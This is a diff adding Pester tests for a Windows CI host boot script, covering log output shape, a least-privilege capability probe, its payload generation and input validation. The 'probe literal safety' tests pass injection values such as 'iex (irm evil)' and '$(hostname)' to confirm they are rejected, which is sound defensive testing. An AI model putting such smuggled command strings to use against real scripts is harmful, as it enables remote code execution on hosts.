@@ -785,6 +785,132 @@ Describe 'service logon account' {
     }
 }
 
+Describe 'boot logging stays out of the success stream' {
+    # THIS IS THE ONE BLOCK IN THIS FILE THAT MUST NOT MOCK Write-BootLog.
+    #
+    # Every other impure test here does `Mock -CommandName Write-BootLog
+    # -MockWith { }`, and that mock is exactly what hid a boot-fatal bug for the
+    # life of this suite. Write-BootLog used `Write-Output`, which puts the line
+    # on the SUCCESS stream, so every function that logged and then returned a
+    # value returned an object[] of the log lines followed by the value:
+    # Invoke-Phase0Preflight could not dot-source the beacon path it had just
+    # captured, Register-SlotAgent's [string] -RegistrationToken received the
+    # array space-joined into one string with a timestamped log line on the
+    # front, and Invoke-Phase5Registration's [IDictionary] -Config would not
+    # bind at all. Mocking the logger away makes every one of those disappear.
+    #
+    # So these cases RUN the real Write-BootLog and assert on the shape of what
+    # a caller gets back. The bash gate (windows-host-startup.selftest.sh)
+    # asserts the text; this asserts the behaviour, on the runtime, where the
+    # array either is or is not there.
+    BeforeEach {
+        # The real path is C:\ci\ci-host.log, which does not exist on
+        # ubuntu-latest -- Write-BootLog would swallow the failure and the test
+        # would still be meaningful, but pointing it somewhere writable lets the
+        # last case assert the file half is still doing its job.
+        $script:LogPathBefore = $script:LogPath
+        $script:LogPath = Join-Path ([System.IO.Path]::GetTempPath()) `
+            ('ci-host-' + [guid]::NewGuid().ToString('N') + '.log')
+    }
+
+    AfterEach {
+        Remove-Item -LiteralPath $script:LogPath -Force -ErrorAction SilentlyContinue
+        $script:LogPath = $script:LogPathBefore
+    }
+
+    It 'lets a function that logs return its value as a scalar' {
+        # The shape of Install-BeaconService: log, log, return a path. Phase 0
+        # captures that path and dot-sources it, which an object[] cannot be.
+        function Invoke-LogThenReturnPath {
+            Write-BootLog 'shim: installed'
+            Write-BootLog 'phase 0: beacon service running, interval 30s'
+            return 'C:\ci\bin\ci-beacon.ps1'
+        }
+
+        $captured = Invoke-LogThenReturnPath
+        @($captured).Count | Should -Be 1
+        $captured | Should -BeOfType ([string])
+        $captured | Should -Be 'C:\ci\bin\ci-beacon.ps1'
+    }
+
+    It 'hands a captured token to a [string] parameter with no log line joined to it' {
+        # The shape of Wait-RegistrationToken into Register-SlotAgent. An
+        # object[] bound to [string] is joined with spaces rather than refused,
+        # which is why this failed silently: config.cmd got a real token with a
+        # timestamped log line in front of it and reported an auth error.
+        function Invoke-LogThenReturnToken {
+            Write-BootLog 'phase 5: registration token present'
+            return 'AABBCC112233'
+        }
+        function Test-TokenParameter {
+            param([Parameter(Mandatory = $true)][string] $RegistrationToken)
+            return $RegistrationToken
+        }
+
+        Test-TokenParameter -RegistrationToken (Invoke-LogThenReturnToken) |
+            Should -Be 'AABBCC112233'
+    }
+
+    It 'returns a config that still binds to an [IDictionary] parameter' {
+        # The shape of Invoke-Phase0Preflight into Invoke-Phase5Registration.
+        # Member access such as $cfg.Slots survives the pollution by member
+        # enumeration -- which is precisely why the fault read as working -- and
+        # the parameter bind is where it actually stops.
+        function Invoke-LogThenReturnConfig {
+            Write-BootLog 'phase 0: preflight'
+            Write-BootLog 'phase 0: image version 4 >= 1'
+            Write-BootLog 'phase 0: ci/boot published'
+            return [ordered] @{ Owner = 'owner'; Repo = 'repo' }
+        }
+        function Test-ConfigParameter {
+            param([Parameter(Mandatory = $true)][System.Collections.IDictionary] $Config)
+            return $Config.Owner
+        }
+
+        $cfg = Invoke-LogThenReturnConfig
+        @($cfg).Count | Should -Be 1
+        Test-ConfigParameter -Config $cfg | Should -Be 'owner'
+    }
+
+    It 'keeps a collected list of slot records free of log lines' {
+        # The shape of Invoke-Phase1SlotSetup: a loop that appends one hash
+        # table per slot while the callee logs. Polluted, the array carries
+        # strings between the records, $_.User is $null for each of them, and
+        # the phase 5 count is wrong on a host whose every log line says success.
+        function Invoke-LogThenReturnRecord {
+            param([int] $Index)
+            Write-BootLog "phase 1: slot $Index provisioned as ci-s$Index"
+            return @{ Index = $Index; User = "ci-s$Index" }
+        }
+
+        $collected = @()
+        for ($i = 1; $i -le 3; $i++) { $collected += (Invoke-LogThenReturnRecord -Index $i) }
+        $collected.Count | Should -Be 3
+        # Joined rather than compared element-wise: a polluted array yields a
+        # $null User for every log line it carries, and an empty segment in this
+        # string is exactly what that looks like.
+        (@($collected | ForEach-Object { $_.User }) -join ',') |
+            Should -Be 'ci-s1,ci-s2,ci-s3'
+    }
+
+    It 'still writes the line to the boot log, and still survives losing it' {
+        Write-BootLog 'phase 0: preflight'
+        (Get-Content -Raw -LiteralPath $script:LogPath) | Should -Match 'phase 0: preflight'
+
+        # The other half of Write-BootLog is deliberately unchanged: the log is
+        # diagnostics, and losing it must never stop a boot. Restored afterwards
+        # so AfterEach still cleans up the file the first half created.
+        $writable = $script:LogPath
+        try {
+            $script:LogPath = Join-Path ([System.IO.Path]::GetTempPath()) `
+                (Join-Path ('no-such-dir-' + [guid]::NewGuid().ToString('N')) 'ci-host.log')
+            { Write-BootLog 'phase 0: preflight' } | Should -Not -Throw
+        } finally {
+            $script:LogPath = $writable
+        }
+    }
+}
+
 Describe 'boot log redaction' {
     It 'strikes the registration token out of a captured line' {
         Get-RedactedLine -Line 'config: --token AABBCC ok' -Secret 'AABBCC' |
@@ -833,5 +959,474 @@ Describe 'service environment block' {
         $block = Get-SlotServiceEnvironment -Index 1 -BrokerEndpoint '' -SlotRoot '/ci/slots'
         $v = Get-ServiceEnvironmentValue -Environment $block
         ($v -join "`n") | Should -Match 'ACTIONS_RUNNER_HOOK_JOB_COMPLETED='
+    }
+}
+
+Describe 'negative capability' {
+    # 403 is the only proof. Everything else is either the finding itself or an
+    # unproved check, and both must fail the boot.
+    It 'accepts a 403 and only a 403' {
+        Test-NegativeCapability -StatusCode 403 | Should -BeTrue
+        Test-NegativeCapability -StatusCode '403' | Should -BeTrue
+    }
+
+    It 'rejects a 200, which is the finding this phase exists to catch' {
+        Test-NegativeCapability -StatusCode 200 | Should -BeFalse
+    }
+
+    # A probe whose token acquisition failed answers 401 to everything and would
+    # otherwise report a perfect score.
+    It 'rejects a 401, which says nothing about what the credential can do' {
+        Test-NegativeCapability -StatusCode 401 | Should -BeFalse
+    }
+
+    It 'reads an unreachable endpoint as unproved rather than as proved' {
+        Test-NegativeCapability -StatusCode $null | Should -BeFalse
+        Test-NegativeCapability -StatusCode 'timeout' | Should -BeFalse
+    }
+}
+
+Describe 'probe verdict' {
+    BeforeAll {
+        $script:CleanProbe = {
+            [pscustomobject] @{
+                runningAs     = 'CI-HOST-ABCD\ci-s1'
+                hostToken     = $true; secretStatus = 403; metricStatus = 403
+                brokerEmail   = 'jobs@p.iam.gserviceaccount.com'
+                siblingStatus = 'denied'; cacheWritable = $true; dnsResolved = $true
+            }
+        }
+    }
+
+    It 'passes a host that proved every property' {
+        Get-ProbeFailure -Result (& $script:CleanProbe) `
+            -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1' | Should -BeNullOrEmpty
+    }
+
+    # The case the whole function exists to get right: a service that never
+    # started writes no file, and "no file" must not read as "no findings".
+    It 'reports a missing verdict as a failure rather than as a pass' {
+        $f = @(Get-ProbeFailure -Result $null -JobServiceAccount '' -ExpectedIdentity 'ci-s1')
+        $f.Count | Should -Be 1
+        $f[0] | Should -Match 'no verdict'
+    }
+
+    It 'fails a host whose identity can still read the App key' {
+        $r = & $script:CleanProbe
+        $r.secretStatus = 200
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'secretmanager'
+    }
+
+    It 'fails a host whose identity can still write the demand metric' {
+        $r = & $script:CleanProbe
+        $r.metricStatus = 200
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'timeSeries'
+    }
+
+    # Two perfect 401s are not two passes.
+    It 'fails a probe that never obtained a host token, whatever else it reported' {
+        $r = & $script:CleanProbe
+        $r.hostToken = $false
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'could not obtain a host token'
+    }
+
+    # The failure the broker exists to prevent, and the one that looks most like
+    # a working broker from every other angle.
+    It 'fails a broker that fell back to the host identity' {
+        $r = & $script:CleanProbe
+        $r.brokerEmail = 'host@p.iam.gserviceaccount.com'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'vends'
+    }
+
+    It 'fails a broker that answered at all on a pool that configured none' {
+        $r = & $script:CleanProbe
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount '' -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'configured no job service account'
+    }
+
+    It 'passes a no-broker pool that reported no broker' {
+        $r = & $script:CleanProbe
+        $r.brokerEmail = ''
+        Get-ProbeFailure -Result $r -JobServiceAccount '' -ExpectedIdentity 'ci-s1' | Should -BeNullOrEmpty
+    }
+
+    It 'fails a slot that could read a sibling workspace' {
+        $r = & $script:CleanProbe
+        $r.siblingStatus = 'allowed'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'another slot'
+    }
+
+    # The reviewer's case: Get-ChildItem throws identically on denied and on
+    # absent, so a sibling workspace that had not been created yet would report
+    # a proved ACL boundary if the payload folded the two together.
+    It 'refuses to read an absent sibling workspace as a proved boundary' {
+        $r = & $script:CleanProbe
+        $r.siblingStatus = 'missing'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'never tested'
+    }
+
+    It 'reports any other sibling outcome as unproved' {
+        $r = & $script:CleanProbe
+        $r.siblingStatus = 'error'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'unproved'
+    }
+
+    # Which exception Windows PowerShell 5.1 raises for an ACL-denied
+    # enumeration is UNOBSERVED on a real host, and the two candidates land in
+    # opposite arms: UnauthorizedAccessException passes, ItemNotFoundException
+    # denies the boot of every host in the pool. The finding therefore has to
+    # carry the type, or the first host to fail tells the operator the boundary
+    # is unproved and gives them nothing to prove it with.
+    It 'names the exception behind an absent sibling workspace' {
+        $r = & $script:CleanProbe
+        $r.siblingStatus = 'missing'
+        Add-Member -InputObject $r -NotePropertyName 'siblingErrorType' `
+            -NotePropertyValue 'System.Management.Automation.ItemNotFoundException'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'ItemNotFoundException'
+    }
+
+    It 'names the exception behind any other sibling outcome' {
+        $r = & $script:CleanProbe
+        $r.siblingStatus = 'error'
+        Add-Member -InputObject $r -NotePropertyName 'siblingErrorType' `
+            -NotePropertyValue 'System.IO.IOException'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'System.IO.IOException'
+    }
+
+    # An empty field says so in words. "the exception was " with nothing after
+    # it reads as a truncated log line, which is the one thing an operator
+    # staring at a denied boot must not have to interpret.
+    It 'says plainly when no exception type was recorded at all' {
+        $r = & $script:CleanProbe
+        $r.siblingStatus = 'missing'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'no exception was recorded'
+    }
+
+    # Service-account emails are canonically lowercase, so a case difference is
+    # a different identity being passed off as the configured one.
+    It 'holds the broker to the exact identity, case included' {
+        $r = & $script:CleanProbe
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount 'Jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'vends'
+    }
+
+    It 'fails an unwritable cache and an unresolvable name' {
+        $r = & $script:CleanProbe
+        $r.cacheWritable = $false
+        $r.dnsResolved = $false
+        @(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1').Count | Should -Be 2
+    }
+
+    # All of them, not the first. The operator gets one look at the serial
+    # console before the controller reclaims the instance.
+    It 'reports every reason at once' {
+        $r = [pscustomobject] @{
+            runningAs     = 'CI-HOST-ABCD\ci-s1'
+            hostToken     = $false; secretStatus = 200; metricStatus = 200
+            brokerEmail   = ''; siblingStatus = 'allowed'; cacheWritable = $false; dnsResolved = $false
+        }
+        @(Get-ProbeFailure -Result $r -JobServiceAccount 'jobs@p.iam.gserviceaccount.com' -ExpectedIdentity 'ci-s1').Count |
+            Should -Be 7
+    }
+
+    # A verdict written by an older image lacks fields this one reads. Absent is
+    # not true, and an unknown property must not throw its way past the gate.
+    # SIX now, not five: a verdict with no runningAs is exactly the older-image
+    # case, and an unattributed verdict is itself a finding.
+    It 'treats an absent field as unproved rather than throwing' {
+        $f = @(Get-ProbeFailure -Result ([pscustomobject] @{ hostToken = $true }) -JobServiceAccount '' -ExpectedIdentity 'ci-s1')
+        $f.Count | Should -Be 6
+    }
+
+    # THE ONE THAT MAKES THE REPOINT FALSIFIABLE. Nothing else in the verdict
+    # can tell these two runs apart: every other check queries the metadata
+    # server, which answers the machine and not the account.
+    It 'fails a verdict produced by LocalSystem rather than by the slot' {
+        $r = & $script:CleanProbe
+        $r.runningAs = 'NT AUTHORITY\SYSTEM'
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'never repointed'
+    }
+
+    It 'fails a verdict that does not say who produced it' {
+        $r = & $script:CleanProbe
+        $r.runningAs = ''
+        (@(Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity 'ci-s1') -join "`n") |
+            Should -Match 'did not report which account'
+    }
+
+    # The machine half of WindowsIdentity.Name is the instance name, which the
+    # harness does not know and which says nothing about the boundary. Matching
+    # on it would deny every real boot.
+    It 'accepts the slot regardless of the machine prefix or case' {
+        $r = & $script:CleanProbe
+        $r.runningAs = 'SOME-OTHER-BOX\CI-S1'
+        Get-ProbeFailure -Result $r -JobServiceAccount $r.brokerEmail -ExpectedIdentity '.\ci-s1' |
+            Should -BeNullOrEmpty
+    }
+}
+
+Describe 'jittered timeout' {
+    # The failure mode of jitter is a bound that quietly became a constant, or
+    # one that became unbounded. Both are invisible from a call site that rolls
+    # its own dice, which is why the roll is a parameter.
+    It 'never returns less than the base' {
+        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll 0.0 | Should -Be 600
+    }
+
+    It 'never exceeds base plus jitter' {
+        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll 1.0 | Should -Be 900
+        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll 0.5 | Should -Be 750
+    }
+
+    # Get-Random is documented as [0,1) but the clamp is not decoration: a caller
+    # that hands this a ratio out of range must not widen the bound past what
+    # the constant advertises.
+    It 'clamps a roll outside zero-to-one' {
+        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll 7.5 | Should -Be 900
+        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 300 -Roll -2.0 | Should -Be 600
+    }
+
+    It 'degenerates to the base when there is no jitter window' {
+        Get-JitteredTimeout -BaseSeconds 600 -JitterSeconds 0 -Roll 0.9 | Should -Be 600
+    }
+}
+
+Describe 'probe payload' {
+    BeforeAll {
+        $script:Payload = Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '127.0.0.1:8081' `
+            -SiblingWorkspace 'C:\ci\slots\ci-s2\w' -CacheRoot 'C:\ci\slots\ci-s1\w' `
+            -ResultPath 'C:\ci\boot-probe.json'
+    }
+
+    # The real metadata server, never the broker. The question is what a job can
+    # reach behind the script's back; asking the broker would measure the
+    # environment block instead of the identity.
+    It 'spends a token minted by the real metadata server' {
+        $script:Payload |
+            Should -Match '169\.254\.169\.254/computeMetadata/v1/instance/service-accounts/default/token'
+    }
+
+    It 'tries both capabilities the reduction removed' {
+        $script:Payload | Should -Match 'secretmanager\.googleapis\.com'
+        $script:Payload | Should -Match 'monitoring\.googleapis\.com'
+    }
+
+    It 'names the secret it was told to try, not a placeholder' {
+        $script:Payload | Should -Match 'secrets/app-key/versions/latest:access'
+    }
+
+    It 'reads the broker at the endpoint it was given' {
+        $script:Payload | Should -Match 'http://127\.0\.0\.1:8081/computeMetadata'
+    }
+
+    # A payload that decides is a payload whose verdict came from the account
+    # under test. It records; Get-ProbeFailure decides.
+    It 'never denies a boot from inside the unprivileged payload' {
+        $script:Payload | Should -Not -Match 'Deny-Boot'
+    }
+
+    It 'writes its verdict where the boot script looks for it' {
+        $script:Payload | Should -Match "Set-Content -LiteralPath 'C:\\ci\\boot-probe\.json'"
+    }
+
+    # The sibling arm decides pass-or-deny from an exception type nobody has
+    # observed on a real host, so it carries the type out with it. One catch,
+    # not three: a typed catch that never fires records nothing, and "nothing
+    # recorded" is indistinguishable from "the field was never added".
+    It 'carries the concrete sibling exception type out in the verdict' {
+        $script:Payload | Should -Match 'siblingErrorType'
+        $script:Payload | Should -Match '\$_\.Exception\.GetType\(\)\.FullName'
+    }
+
+    # Without this the repoint has no witness: every other field in the verdict
+    # is a metadata answer and reads identically for any account on the host.
+    # Not $env:USERNAME -- a service's environment block is data the SCM copies
+    # in and this script rewrites elsewhere, so it can disagree with the process
+    # token, which is the exact divergence being tested for.
+    It 'records the account it is actually running as' {
+        $script:Payload | Should -Match 'WindowsIdentity\]::GetCurrent\(\)'
+
+        # Comments stripped before the negative assertion, the same way code_of()
+        # does it in the bash self-tests. The claim under test is that no code
+        # path in the payload reads $env:USERNAME -- and the payload explains at
+        # length why it does not, naming the variable to do so. Asserting over
+        # the raw text makes that explanation the thing that fails, which would
+        # push the next author to delete the reasoning to get the bar green.
+        $code = ($script:Payload -split "`n" | Where-Object { $_ -notmatch '^\s*#' }) -join "`n"
+        $code | Should -Not -Match '\$env:USERNAME'
+    }
+
+    It 'is valid PowerShell rather than merely a string' {
+        { [scriptblock]::Create($script:Payload) } | Should -Not -Throw
+    }
+
+    It 'omits the broker read entirely when there is no broker' {
+        $p = Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+            -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1'
+        $p | Should -Not -Match 'service-accounts/default/email'
+    }
+}
+
+Describe 'probe literal safety' {
+    # Everything Get-ProbeScript interpolates becomes code in a payload that
+    # runs holding a live host token, and the secret name and broker endpoint
+    # both arrive from instance metadata -- which section 3A says outright is
+    # writable by anything holding the machine's identity.
+    It 'accepts the shapes the pool actually produces' {
+        Test-ProbeLiteral -Value 'ci-app-key' -Kind 'name' | Should -BeTrue
+        Test-ProbeLiteral -Value '127.0.0.1:8081' -Kind 'endpoint' | Should -BeTrue
+        Test-ProbeLiteral -Value 'C:\ci\slots\ci-s1\w' -Kind 'path' | Should -BeTrue
+    }
+
+    It 'accepts an empty value, which means the caller configured nothing' {
+        Test-ProbeLiteral -Value '' -Kind 'name' | Should -BeTrue
+        Test-ProbeLiteral -Value '' -Kind 'endpoint' | Should -BeTrue
+    }
+
+    # One apostrophe closes the literal it lands in and appends statements.
+    It 'rejects a value that would close its own literal' {
+        Test-ProbeLiteral -Value "k'; iex (irm evil); '" -Kind 'name' | Should -BeFalse
+        Test-ProbeLiteral -Value "1.2.3.4:1'; iex (irm evil); '" -Kind 'endpoint' | Should -BeFalse
+        Test-ProbeLiteral -Value "C:\w'; iex (irm evil); '" -Kind 'path' | Should -BeFalse
+    }
+
+    It 'rejects a subexpression and a newline as well as a quote' {
+        Test-ProbeLiteral -Value 'a$(hostname)' -Kind 'name' | Should -BeFalse
+        Test-ProbeLiteral -Value "a`nb" -Kind 'name' | Should -BeFalse
+        Test-ProbeLiteral -Value 'host:80/x' -Kind 'endpoint' | Should -BeFalse
+    }
+
+    # Throw, not sanitize: a stripped value still builds a payload, and a
+    # payload that measured the wrong secret is worse than a stopped boot.
+    It 'refuses to build a payload from an injected secret name' {
+        { Get-ProbeScript -SecretName "k'; iex (irm evil); '" -BrokerEndpoint '' `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+    }
+
+    It 'refuses to build a payload from an injected broker endpoint' {
+        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint "1.2.3.4:1'; iex (irm evil); '" `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+    }
+
+    # MetadataRoot is a parameter like the rest, and "no caller overrides it
+    # today" is a property of the callers, not of the function. The contract
+    # this guard states is that EVERY interpolated value is validated.
+    It 'validates the metadata root it was handed, not just the ones from metadata' {
+        Test-ProbeLiteral -Value 'http://169.254.169.254/computeMetadata/v1' -Kind 'url' | Should -BeTrue
+        Test-ProbeLiteral -Value "http://h/v1'; iex (irm evil); '" -Kind 'url' | Should -BeFalse
+        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' `
+                -MetadataRoot "http://h/v1'; iex (irm evil); '" } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+    }
+
+    It 'refuses to build a payload from an injected path' {
+        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+                -SiblingWorkspace "C:\s2'; iex (irm evil); '" -CacheRoot 'C:\s1' } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+        { Get-ProbeScript -SecretName 'app-key' -BrokerEndpoint '' `
+                -SiblingWorkspace 'C:\s2' -CacheRoot 'C:\s1' -ResultPath "C:'; iex (irm evil); '" } |
+            Should -Throw -ExpectedMessage '*interpolated as code*'
+    }
+}
+
+Describe 'probe service definition' {
+    BeforeAll {
+        $script:ProbeXml = Get-ProbeServiceConfig -ScriptPath 'C:\ci\bin\ci-boot-probe.ps1'
+    }
+
+    # Manual and non-restarting, unlike every other service this file installs.
+    # The probe is a one-shot measurement: Automatic re-runs it on a reboot the
+    # boot script is not driving, and a restart policy turns a payload that
+    # cannot start into a loop instead of the missing file the verdict needs.
+    It 'does not start itself on a later boot' {
+        $script:ProbeXml | Should -Match '<startmode>Manual</startmode>'
+    }
+
+    It 'has no restart policy, so a payload that cannot start stays not started' {
+        $script:ProbeXml | Should -Not -Match 'onfailure'
+    }
+
+    It 'runs the payload it was given, non-interactively' {
+        $script:ProbeXml | Should -Match 'ci-boot-probe\.ps1'
+        $script:ProbeXml | Should -Match '\-NonInteractive'
+    }
+
+    It 'is well-formed XML' {
+        { [xml] $script:ProbeXml } | Should -Not -Throw
+    }
+}
+
+Describe 'probe sibling workspace' {
+    # The directory the probe must FAIL to read. Get-ProbeFailure treats a
+    # sibling that was 'missing' as a finding rather than a pass -- a path that
+    # is not there proves nothing about an ACL -- so choosing one that does not
+    # exist would deny every boot in the pool rather than none.
+    #
+    # Roots are injected, because Join-Path 'C:\ci\slots' 1 throws
+    # DriveNotFoundException on the ubuntu-latest runner this suite runs on.
+    It 'points a multi-slot host at another slot workspace' {
+        Get-ProbeSiblingWorkspace -Index 1 -SlotCount 2 -SlotRoot '/slots' -FallbackRoot '/bin' |
+            Should -Be (Join-Path '/slots' '2')
+    }
+
+    It 'points a slot that is not the first one back at the first' {
+        Get-ProbeSiblingWorkspace -Index 2 -SlotCount 2 -SlotRoot '/slots' -FallbackRoot '/bin' |
+            Should -Be (Join-Path '/slots' '1')
+    }
+
+    # The Windows pool pins ci-slots to 1, so this is the case almost every host
+    # takes. C:\ci\bin is not a weaker subject than a sibling workspace: it
+    # exists on every host, phase 1 locks it to SYSTEM and Administrators with
+    # no slot ACE, and it holds the beacon script the SCM re-runs as LocalSystem.
+    It 'falls back to a directory that exists on a single-slot host' {
+        Get-ProbeSiblingWorkspace -Index 1 -SlotCount 1 -SlotRoot '/slots' -FallbackRoot '/bin' |
+            Should -Be '/bin'
+    }
+
+    It 'never names the probing slot own workspace' {
+        foreach ($count in 1, 2, 4) {
+            Get-ProbeSiblingWorkspace -Index 1 -SlotCount $count -SlotRoot '/slots' -FallbackRoot '/bin' |
+                Should -Not -Be (Join-Path '/slots' '1')
+        }
+    }
+}
+
+Describe 'recovery-policy guard' {
+    # These RUN the function rather than reading it, and that is the whole point.
+    # Clear-ServiceRecoveryAction shipped on main calling Get-RunnerServiceName
+    # without the -AgentName that had become mandatory: a ParameterBindingException
+    # in phase 5 on every Windows boot, in a function both text-reading gates
+    # happily parsed and linted. Nothing here reaches sc.exe -- every case is
+    # refused by the guard first, which is also why it can run on ubuntu-latest.
+    It 'refuses a name that is not a runner service at all' {
+        { Clear-ServiceRecoveryAction -ServiceName 'not-a-runner-service' -AgentName 'ci-abc-s1' } |
+            Should -Throw -ExpectedMessage '*not a runner service name*'
+    }
+
+    # Shape alone is not enough. A stale or restored .service file naming a
+    # SIBLING slot's service is well-formed, and clearing recovery there would
+    # take the policy off an agent this slot does not own.
+    It 'refuses a well-formed name belonging to another slot' {
+        { Clear-ServiceRecoveryAction -ServiceName 'actions.runner.o-r.ci-abc-s2' -AgentName 'ci-abc-s1' } |
+            Should -Throw -ExpectedMessage '*not a runner service name*'
+    }
+
+    It 'refuses an empty marker rather than passing it to sc.exe' {
+        { Clear-ServiceRecoveryAction -ServiceName ' ' -AgentName 'ci-abc-s1' } |
+            Should -Throw -ExpectedMessage '*not a runner service name*'
     }
 }
